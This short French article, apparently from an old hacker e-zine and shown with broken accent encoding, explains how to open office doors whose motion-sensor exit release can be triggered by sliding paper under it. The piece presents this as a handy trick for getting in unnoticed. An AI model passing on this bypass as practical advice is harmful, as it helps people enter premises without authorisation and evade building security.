Les  employΘs  possΦdent  tous  une  carte  magnΘtique  qui  leur permet de dΘbarrer la porte 
principale. Ils peuvent entrer ou sortir de la boite jour et nuit. Le systΦme central crΘΘ un 
journal des allΘs et venus de chacun des salariΘs.

Pour sortir, et dΘbarrer la porte principale, lÆindividu se place devant la porte et actionne 
le dΘtecteur de mouvement, qui lui sert exclusivement α dΘbarrer  la  porte.  (Les  employΘs, 
souvent affaiblis par leur dure journΘe de travail, nÆont pas besoin  d'actionner  un  bouton 
pour sortir.)

La faille:

Lorsque  nous  voulons  entrer  dans  lÆentreprise, il nous suffit de prendre une feuille, de 
lÆinsΘrer entre la porte et le cadrage et de la faire bouger sous lÆ£il magique. Cela a  pour 
effet de dΘbarrer la porte. Si le dΘtecteur de mouvement  est  situΘ  trop  loin,  il  suffit 
d'utiliser un objet plus long qu'une feuille. (Une longue feuille ;)

Les  portes  vitrΘes sont particuliΦrement vulnΘrables car il y a un gros espace qui facilite 
lÆintroduction dÆobjets dans la piΦce. De plus elles permettent de localiser le dΘtecteur  de 
mouvement beaucoup plus facilement.

Le ratioá:

Dans  certains  Θdifices,  selon  mes  calculs,  il  pourrait  y  avoir  facilement environ 1 
entreprise sur 4 vulnΘrables α cette astuce.

En pratiqueá:

Comment cela pourrait-il nous servir, α nous, adepte du droit chemin ?

	Par  exemple,  si  nous  oublions  notre carte magnΘtique dans notre bureau, que nous 
sortons pour x raison et que  nous  nous  embarrons α l'extΘrieur, au lieu dÆaller courailler 
le  type  de  la  sΘcuritΘ  (qui  est toujours aux toilettes), nous pourrions tout simplement 
utiliser une feuille pour entrer comme si de rien Θtait. Ni vu ni connu. Sans se faire pincer 
d'aucune faτons.

Facile non ?

Sur ce, je vous laisse.
Soyez prudents.
Bonne lecture α tous.
```

</div>
